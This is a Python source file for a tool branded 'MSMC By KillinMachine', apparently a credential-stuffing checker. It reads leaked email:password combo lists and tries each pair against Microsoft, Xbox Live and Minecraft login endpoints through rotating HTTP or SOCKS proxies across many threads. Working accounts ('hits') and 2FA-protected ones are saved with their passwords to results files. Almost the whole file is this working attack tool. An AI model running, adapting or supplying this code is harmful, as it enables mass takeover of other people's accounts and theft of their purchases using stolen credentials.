import requests, re, readchar, os, time, threading, random, unidecode
from time import gmtime, strftime
from colorama import Fore
from console import utils
from tkinter import filedialog
logo = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F" \
             "&redirect_uri=https://login.live.com/oauth20_desktop.srf" \
             "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
emails = []
passwords = []
day = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
hits,bad,twofa,cpm,cpm1,errors,retries,checked = 0,0,0,0,0,0,0,0

def get_urlPost_sFTTag(session):
    r = session.get(sFTTag_url)
    text = r.text
    match = re.match(r'.*value="(.+?)".*', text, re.S)
    if match is not None:
        sFTTag = match.group(1)
        match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
        if match is not None:
            return match.group(1), sFTTag

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, hits
    try:
        data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = None
            for item in login_request.url.split("#")[1].split("&"):
                key, value = item.split("=")
                if key == 'access_token':
                    token = requests.utils.unquote(value)
                    break
            return token
        elif "access_token" not in str(login_request.url) or str(login_request.url) == sFTTag_url:
            if "protect your account" in login_request.text:
                twofa+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/2fa_{day}.txt", 'a') as file: file.write(f"{email}:{password}\n")
                checked+=1
                cpm+=1
                return None
            elif "Sign in to" in login_request.text:
                bad+=1
                if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
                checked+=1
                cpm+=1
                return None
    except Exception as e:
        retries+=1
        threading.Thread(target=Checker, args=(email, password, proxylist)).start()


def authenticate(email, password, proxy):
    global hits
    try:
        session = requests.Session()
        session.proxies = proxy
        token = get_xbox_rps(session, email, password, *get_urlPost_sFTTag(session))
        if token is not None:
            xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
            js = xbox_login.json()
            xbox_token = js.get('Token')
            if xbox_token is not None:
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xsts.json()
                xsts_token = js.get('Token')
                if xsts_token is not None:
                    mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
                    access_token = mc_login.json().get('access_token')
                    if access_token is not None:
                        mc = name(access_token, proxy)
                        if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
                        hits+=1
                        with open(f"results/Hits_{day}.txt", 'a') as file: file.write(f"{mc} | {email}:{password}\n")
    except:
        retries+=1
        threading.Thread(target=Checker, args=(email, password, proxylist)).start()


def name(access_token, proxy):
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, proxies=proxy)
    if r.status_code == 200:
        return r.json()['name']

def Load():
    global ComboName
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    ComboName = os.path.basename(filename.name)
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        try:
            with open(filename.name, 'r+') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        Dump = line.replace('\n', '')
                        Combos.append(Dump)
                    except: pass
            Dumped =  list(dict.fromkeys(Combos))
            RemovedLines = len(Combos) - len(Dumped)
            print(Fore.LIGHTBLUE_EX+f"[{RemovedLines}] Dupes Removed.")
            for lines in Combos:
                try:
                    email = lines.split(":")[0].replace('\n', '')
                    password = lines.split(":")[1].replace('\n', '')
                    if email == "" or password == "": pass
                    emails.append(email)
                    passwords.append(password)
                except: pass
            print(Fore.LIGHTBLUE_EX+f"[{len(emails)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print()
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global hits, bad, twofa, cpm, cpm1, errors, retries, checked
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"MSMC By KillinMachine | Checked: {checked}\{len(Combos)}  -  Good: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen, args=()).start()    

def cuiscreen():
    global hits, bad, twofa, cpm, cpm1, errors, retries, checked
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(Combos)}] Checked")
    print(f" [{hits}] Good")
    print(f" [{bad}] Bad")
    print(f" [{twofa}] 2FA")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"MSMC By KillinMachine | Checked: {checked}\{len(Combos)}  -  Good: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen, args=()).start()

def finishedscreen():
    os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+hits)
    print("Bad: "+bad)
    print("2FA: "+twofa)
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def Checker(email, password, proxylist):
    try:
        global hits,bad,twofa,cpm,cpm1,errors,retries,checked
        sess = requests.Session()
        sess.verify = False
        if proxytype != "'4'": proxy = random.choice(proxylist)
        if proxytype  == "'1'": proxy_for_check = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": proxy_for_check = {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": proxy_for_check = {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
        elif proxytype  == "'4'": proxy_for_check = None
        else: proxy_for_check = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        authenticate(str(email), str(password), proxy_for_check)
    except Exception as e:
        retries+=1
        threading.Thread(target=Checker, args=(email, password, proxylist)).start()    

def Main():
    global proxytype, screen
    utils.set_title("MSMC By KillinMachine")
    os.system('cls')
    print(logo)
    try:
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None") 
    proxytype = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+day): os.makedirs('results/'+day)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    num = 0
    while 1:
        if threading.active_count() < int(thread):
            if len(Combos) > num:
                try:
                    num+=1
                    threading.Thread(target=Checker, args=(emails[num], passwords[num], proxylist)).start()
                except:
                    finishedscreen()
            else:
                finishedscreen()
Main()      
